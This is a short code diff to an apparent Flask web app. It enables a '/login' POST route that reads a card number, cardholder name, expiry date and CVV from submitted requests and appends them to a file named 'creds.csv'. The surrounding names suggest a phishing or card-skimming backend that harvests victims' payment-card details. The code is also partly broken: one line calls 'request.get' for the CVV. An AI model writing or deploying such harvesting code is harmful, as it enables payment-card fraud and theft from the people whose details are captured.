@@ -10,10 +10,10 @@ def index():
 @app.route("/login", methods=["POST"])
 def login():
     
-    #card_number = request.json.get("card_number")
-    #name = request.json.get("name")
-    #expiry = request.json.get("expiry")
-    #cvv = request.get("cvv")
+    card_number = request.json.get("card_number")
+    name = request.json.get("name")
+    expiry = request.json.get("expiry")
+    cvv = request.get("cvv")
 
     #card_number = request.json.get("card_number")
     #name = request.json.get("name")
@@ -31,9 +31,9 @@ def login():
     #expiry = request.json.get("expiry")
     
     
-    #with open("creds.csv", "a+") as f:
-        #csv_writer = csv.writer(f)
-        #csv_writer.writerow([card_number, name, expiry, cvv])
+    with open("creds.csv", "a+") as f:
+        csv_writer = csv.writer(f)
+        csv_writer.writerow([card_number, name, expiry, cvv])
         
         
      #with open("creds.cvs", "a+") as f:
